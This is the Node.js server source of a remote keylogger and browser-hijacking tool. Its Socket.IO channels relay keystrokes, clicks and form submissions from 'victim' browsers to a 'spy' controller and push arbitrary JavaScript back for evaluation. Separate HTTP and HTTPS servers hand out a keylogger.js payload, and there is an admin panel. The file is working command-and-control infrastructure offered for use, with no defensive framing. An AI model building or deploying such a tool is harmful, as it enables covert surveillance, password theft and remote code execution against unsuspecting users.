import express from 'express';
import http from 'http';
import https from 'https';
import fs from 'fs';
import path from 'path';
import { Server } from 'socket.io';
import chalk from 'chalk';
import * as logger from './middlewares/logger.js'

const __dirname = path.resolve()

// Config ports to listen on
const config = {
    HTTPS_PORT: 8443,
    HTTP_PORT: 8080,
    WEB_SOCKET_PORT: 3000
}

const app = express();

app.use(logger.request)
app.use("/", express.static(path.join(__dirname, 'public')));
app.use("/victim", (req, res) => {
    res.sendFile(__dirname + "/app/pages/victim.html")
});
app.use("/controller", (req, res) => {
    res.sendFile(__dirname + "/app/pages/controller.html")
});


const socketServer = http.createServer(app);
const io = new Server(socketServer, {
    cors: {
        origin: '*',
      }
});

const spy = io
    .of('/spy')
    .on('connection', (socket) => {
        logger.socketSpy(socket, '', 'connected');

        socket.on('eval', function (js) {
            logger.socketSpy(socket, 'eval', js);
            victim.emit('eval', js);
        });

        socket.on('disconnect', () => {
            logger.socketSpy(socket, '', 'disconnected');
        });
    });

const victim = io
    .of('/victim')
    .on('connection', (socket) => {
        logger.socketVictim(socket, '', 'connected');

        socket.on('type', function (key) {
            logger.socketVictim(socket, 'type', key);
            spy.emit('type', key);
        });

        socket.on('focus', function (focus) {
            logger.socketVictim(socket, 'focus', focus);
            spy.emit('focus', focus);
        });

        socket.on('click', function (click) {
            logger.socketVictim(socket, 'click', click);
            spy.emit('submit', click);
        });

        socket.on('submit', function (submit) {
            logger.socketVictim(socket, 'submit', submit);
            spy.emit('submit', submit);
        });


        socket.on('disconnect', function () {
            logger.socketVictim(socket, '', 'disconnected');
        });
    });

var privateKey = fs.readFileSync(__dirname + '/certs/server.key', 'utf8');
var certificate = fs.readFileSync(__dirname + '/certs/server.crt', 'utf8');

var encryption = {
    key: privateKey,
    cert: certificate
};

https.createServer(encryption, (req, res) => {
    fs.readFile(__dirname + '/app/utils/keylogger.js', function (err, data) {
        if (err) {
            res.writeHead(404);
            res.end(JSON.stringify(err));
            return;
        }
        res.writeHead(200);
        res.end(data);
    });
}).listen(config.HTTPS_PORT, () => {
    console.log(chalk.green(`HTTPS delivery server: https://0.0.0.0:${config.HTTPS_PORT}`));
});

http.createServer((req, res) => {
    fs.readFile(__dirname + '/app/utils/keylogger.js', function (err, data) {
        if (err) {
            res.writeHead(404);
            res.end(JSON.stringify(err));
            return;
        }
        res.writeHead(200);
        res.end(data);
    });
}).listen(config.HTTP_PORT, () => {
    console.log(chalk.green(`HTTP delivery server: http://0.0.0.0:${config.HTTP_PORT}`));
});



socketServer.listen(config.WEB_SOCKET_PORT, () => {
    console.log(chalk.blue(`WebSocket server listen on ws://0.0.0.0:${config.WEB_SOCKET_PORT}`));
    console.log(chalk.blue(`Painel admin at http://localhost:${config.WEB_SOCKET_PORT}/controller`));
});
